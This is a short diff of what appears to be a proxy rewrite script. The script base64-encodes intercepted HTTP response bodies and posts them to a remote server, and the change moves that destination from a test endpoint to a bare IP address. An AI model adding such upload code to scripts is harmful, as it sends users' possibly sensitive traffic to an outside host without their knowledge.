@@ -25,7 +25,7 @@ const $req = req();
 var body = $response.body;
 console.log("start upload");
 const testServer = {
-    url: 'https://ptsv2.com/t/5y3is-1625470771/post',
+    url: 'http://81.68.92.48:9009/',
     body: btoa(body)
   };
   $req.post(testServer, function(error, response, data) {
